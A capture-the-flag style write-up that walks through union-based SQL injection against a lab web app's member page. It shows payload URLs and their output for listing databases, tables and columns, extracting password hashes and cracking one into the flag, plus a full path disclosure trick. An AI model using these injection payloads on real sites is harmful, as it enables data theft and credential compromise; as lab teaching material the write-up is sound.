# http://192.168.99.100/?page=member&id=1&Submit=Submit

### getting current database name and listing all databases:

`http://192.168.99.100/?page=member&id=42 union select database(), schema_name from information_schema.schemata&Submit=Submit`

##### result:

```
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : information_schema
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_Brute_Force
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_Sql_Injection
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_guestbook
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_images
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_survey
```

so current database is `Member_Sql_Injection`,
the other databases are `Member_Brute_Force`, `Member_guestbook`, `Member_images`, `Member_survey`



### getting a list of tables in current database:


`http://192.168.99.100/?page=member&id=42 union select table_name, create_time from information_schema.tables where table_schema=database()&Submit=Submit`

##### result:

```
ID: 42 union select table_name, create_time from information_schema.tables where table_schema=database()
First name: users
Surname : 2015-09-16 15:55:03
```

so our database has a table called `users`


### listing all column names and types:
`http://192.168.99.100/?page=member&id=42 union select column_name, column_type from information_schema.columns where table_schema=database()&Submit=Submit`

##### result:

```
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: user_id
Surname : int(11)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: first_name
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: last_name
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: town
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: country
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: planet
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: Commentaire
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: countersign
Surname : varchar(255)
```

so we have the columns `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`

### getting the juicy info:

`http://192.168.99.100/?page=member&id=42 union select Commentaire, countersign from users&Submit=Submit`


##### result:

```
ID: 42 union select Commentaire, countersign from users
First name: Amerca !
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9
ID: 42 union select Commentaire, countersign from users
First name: Ich spreche kein Deutsch.
Surname : 60e9032c586fb422e2c16dee6286cf10
ID: 42 union select Commentaire, countersign from users
First name: ????? ????????????? ?????????
Surname : e083b24a01c483437bcf4a9eea7c1b4d
ID: 42 union select Commentaire, countersign from users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```


### solution:
googling the hash `5ff9d0165b4f92b14994e5c685cdce28` produces the original string `FortyTwo`

as per instructions SHA-256 of `fortytwo` is:

#### `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

we have the flag, great success


#

### bonus: full path disclosure vulnerability


consider this link: `http://192.168.99.100/?page=member&id=1&Submit=Submit`

if we change the name of the `id` parameter to an anything else, then the application reveals its internal directory structure

```sh
e1z2r10p4% curl -s -L 'http://192.168.99.100/?page=member&ida=1&Submit=Submit' -o - | tail -n 2
Notice: Undefined index: id in /var/www/html/includes/member.inc.php on line 10
<pre>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1</pre>
```

this also makes it evident that the rest of the pages are stored in the same folder and have a similar name pattern:
|url|file|
|-|-|
/index.php?page=member|/var/www/html/includes/member.inc.php
/index.php?page=upload|/var/www/html/includes/upload.inc.php
/index.php?page=survey|/var/www/html/includes/survey.inc.php
/index.php?page=signin|/var/www/html/includes/signin.inc.php


... you get the idea

you can verify by opening 

`http://192.168.99.100/includes/default.inc.php` or

`http://192.168.99.100/includes/survey.inc.php` ... etc

